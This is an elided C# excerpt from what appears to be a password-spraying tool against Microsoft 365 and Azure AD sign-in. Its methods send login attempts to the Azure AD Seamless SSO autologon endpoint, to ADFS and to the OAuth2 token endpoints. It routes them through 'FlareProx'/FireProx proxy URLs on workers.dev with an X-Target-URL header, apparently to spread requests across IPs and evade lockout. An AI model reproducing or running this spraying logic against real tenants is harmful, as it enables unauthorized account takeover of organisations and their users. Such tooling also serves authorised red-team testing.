    ...
    class MSOLHandler
    {
        ...
        public async Task<(BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError)> LoginSprayAttempt(SprayAttempt sprayAttempts, UserRealmResp userRealmResp)
        {
            ...
            if (sprayAttempts.AADSSO)
            {
                ...
                // Build the target URL for X-Target-URL header
                var targetAadSsoUrl = $"https://autologon.microsoftazuread-sso.com/{domain}/winauth/trust/2005/usernamemixed?client-request-id={Guid.NewGuid()}";
                // Use FlareProx endpoint URL (sprayAttempts.FireProxURL) for the actual request
                var aadSsoUrl = sprayAttempts.FireProxURL;
    ...
    <s:Body>
        <wst:RequestSecurityToken Id='RST0'>
            ...
            adfsRetry:
                ...
                // Build target ADFS URL from userRealmResp
                ...
                UriBuilder builder = new UriBuilder(targetAdfsUrl);
                builder.Query = queryParams.ToString();

                // Add X-Target-URL header for FlareProx with the full ADFS URL
                string targetUrl = builder.ToString();
                client.DefaultRequestHeaders.Add("X-Target-URL", targetUrl);
            ...
            if (!userRealmResp.Adfs && !sprayAttempts.AADSSO)
            {
                var loginPostBody = new FormUrlEncodedContent(new[]
               {
                ...
                {
                    targetUrl = "https://login.microsoftonline.us/common/oauth2/token";
                }
                else
                {
                    targetUrl = "https://login.microsoftonline.com/common/oauth2/token";
                }
        ...
        public async Task<(BearerTokenResp bearerToken, BearerTokenErrorResp bearerTokenError)> LoginAttemptFireProx(string username, string password, string url, (string Uri, string clientId) randomO365Res, bool print = true, string userAgent = "")
        {
            ...
            // Check if URL is a FlareProx endpoint (contains "workers.dev")
            // If so, add X-Target-URL header with the target OAuth2 token endpoint
            if (url.Contains("workers.dev"))
            {
                string targetUrl = "https://login.microsoftonline.com/common/oauth2/token";
                client.DefaultRequestHeaders.Add("X-Target-URL", targetUrl);
            }
